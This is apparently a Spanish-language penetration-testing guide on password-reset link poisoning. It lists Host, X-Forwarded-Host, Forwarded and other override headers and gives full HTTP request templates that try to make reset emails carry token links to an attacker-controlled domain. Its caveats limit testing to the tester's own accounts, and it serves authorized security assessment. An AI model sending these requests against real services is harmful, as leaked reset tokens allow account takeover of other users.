# 🗡️ Envenenamiento del enlace de recuperación: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 📚 Banco ampliado de payloads

[Abrir el catálogo por técnica y los diccionarios de PayloadsAllTheThings](Catalogo_PATT.md). Los bloques de esta guía explican las pruebas iniciales; el catálogo reúne variantes adicionales por motor, parser y contexto.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Cabeceras de origen una por solicitud

```text
Host: {DOMINIO_LEGITIMO}
Host: {DOMINIO_CONTROLADO}
X-Forwarded-Host: {DOMINIO_CONTROLADO}
X-Original-Host: {DOMINIO_CONTROLADO}
X-Host: {DOMINIO_CONTROLADO}
```

**Cuándo usarlo:** Solicitar reset solo para un correo propio y cambiar una cabecera por intento. Verificar el enlace recibido en ese buzón: la reflexión en HTML no prueba poisoning.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning).


### Variantes de host y puerto

```text
Host: {DOMINIO_LEGITIMO}:443
Host: {DOMINIO_LEGITIMO}:{PUERTO_DE_PRUEBA}
Host: {DOMINIO_CONTROLADO}:443
Forwarded: host={DOMINIO_CONTROLADO};proto=https
X-Forwarded-Proto: https
```

**Cuándo usarlo:** Solo tiene sentido si proxy y aplicación reconstruyen URL absolutas desde estas cabeceras. Verificar que el enlace de reset use el host alterado; no abrirlo en sistemas ajenos.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning).


## 🧭 Payloads por contexto

### Construcción de enlace en rutas de recuperación

```text
POST /forgot-password
POST /api/auth/forgot-password
POST /api/v1/password/reset
POST /account/recovery/start
POST /users/{USUARIO_PROPIO}/reset
```

**Cuándo usarlo:** Identificar el endpoint real desde el flujo de una cuenta propia. Cada ruta es candidata a adaptar, no un listado para enviar masivamente.

**Fuente:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html).


### Origen absoluto y cabecera duplicada

```http
POST https://{DOMINIO_LEGITIMO}/forgot-password HTTP/1.1
Host: {DOMINIO_LEGITIMO}

POST /forgot-password HTTP/1.1
Host: {DOMINIO_LEGITIMO}
Host: {DOMINIO_CONTROLADO}
```

**Cuándo usarlo:** Plantillas alternativas para un proxy autorizado. Las cabeceras Host duplicadas son ambiguas; probar individualmente y detenerse si hay efectos sobre usuarios ajenos.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning).


## 🔥 Payloads avanzados

### Token en URL de correo y destino

```text
https://{DOMINIO_LEGITIMO}/reset?token={TOKEN_PROPIO}
https://{DOMINIO_CONTROLADO}/reset?token={TOKEN_PROPIO}
https://{DOMINIO_LEGITIMO}/reset/{TOKEN_PROPIO}
https://{DOMINIO_CONTROLADO}/reset/{TOKEN_PROPIO}
```

**Cuándo usarlo:** Comparar únicamente correos generados para tu cuenta. El impacto requiere que un token real sea enviado al dominio controlado y sea canjeable; no registrar el token sin redacción.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning).


## 🔬 Pruebas guiadas por escenario

### 1. Host directo

**Objetivo:** Solicitar reset solo de la cuenta propia con Host controlado.

```http
POST /forgot-password HTTP/1.1
Host: {CONTROLLED_HOST}
Content-Type: application/x-www-form-urlencoded

email={EMAIL_PROPIO}
```

**Interpretación:** Inspeccionar el correo recibido: la prueba relevante es la URL con token, no el texto HTTP inmediato.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning).

### 2. X-Forwarded-Host

**Objetivo:** Conservar Host legítimo y variar el host que el proxy podría entregar al backend.

```http
POST /forgot-password HTTP/1.1
Host: {ORIGEN}
X-Forwarded-Host: {CONTROLLED_HOST}
Content-Type: application/x-www-form-urlencoded

email={EMAIL_PROPIO}
```

**Interpretación:** Confirmar dominio del enlace recibido. No afirmar toma de cuenta si el token no aparece o no es canjeable.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).

### 3. Forwarded host

**Objetivo:** Aislar la cabecera estándar Forwarded en una solicitud propia.

```http
POST /forgot-password HTTP/1.1
Host: {ORIGEN}
Forwarded: host={CONTROLLED_HOST};proto=https
Content-Type: application/x-www-form-urlencoded

email={EMAIL_PROPIO}
```

**Interpretación:** El backend puede ignorarla. Registrar si el correo usa exactamente el host aportado.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).

### 4. X-Host

**Objetivo:** Probar una cabecera de override documentada, por separado.

```http
POST /forgot-password HTTP/1.1
Host: {ORIGEN}
X-Host: {CONTROLLED_HOST}
Content-Type: application/x-www-form-urlencoded

email={EMAIL_PROPIO}
```

**Interpretación:** Comparar con el caso base sin X-Host; solo la URL recibida establece influencia real.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).

### 5. X-HTTP-Host-Override

**Objetivo:** Probar otro override en una request separada.

```http
POST /forgot-password HTTP/1.1
Host: {ORIGEN}
X-HTTP-Host-Override: {CONTROLLED_HOST}
Content-Type: application/x-www-form-urlencoded

email={EMAIL_PROPIO}
```

**Interpretación:** Evitar envíos repetidos masivos; los correos y tokens de la cuenta propia permiten comparar.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).

### 6. Puerto de Host

**Objetivo:** Comprobar si el validador acepta dominio correcto pero usa un puerto manipulado en el enlace.

```http
POST /forgot-password HTTP/1.1
Host: {ORIGEN}:8443
Content-Type: application/x-www-form-urlencoded

email={EMAIL_PROPIO}
```

**Interpretación:** No es fuga si el host sigue siendo legítimo; interesa un parser que valida host y genera una URL distinta.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).

### 7. Host duplicado en laboratorio

**Objetivo:** Observar desacuerdo de parsing en un entorno aislado propio.

```http
POST /forgot-password HTTP/1.1
Host: {ORIGEN}
Host: {CONTROLLED_HOST}
Content-Type: application/x-www-form-urlencoded

email={EMAIL_PROPIO}
```

**Interpretación:** Muchos frontends lo rechazan. No enviar a infraestructura compartida sin permiso porque puede afectar enrutamiento.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).

### 8. X-Forwarded-Server

**Objetivo:** Solicitar un único reset de correo propio con la cabecera de host alternativa documentada.

```http
POST /forgot-password HTTP/1.1
Host: {ORIGEN}
X-Forwarded-Server: {CONTROLLED_HOST}
Content-Type: application/x-www-form-urlencoded

email={EMAIL_PROPIO}
```

**Interpretación:** Comparar la URL del correo con control sin header. Solo hay envenenamiento si el enlace canjeable incorpora el host propio.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).

### 9. URL absoluta en request line

**Objetivo:** En laboratorio con proxy que acepte absolute-form, contrastar autoridad de la request line y Host.

```http
POST https://{CONTROLLED_HOST}/forgot-password HTTP/1.1
Host: {ORIGEN}
Content-Type: application/x-www-form-urlencoded

email={EMAIL_PROPIO}
```

**Interpretación:** Mantener la conexión al origen autorizado y usar solo correo propio. Confirmar que el token aparece en URL controlada, no solo un 302.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
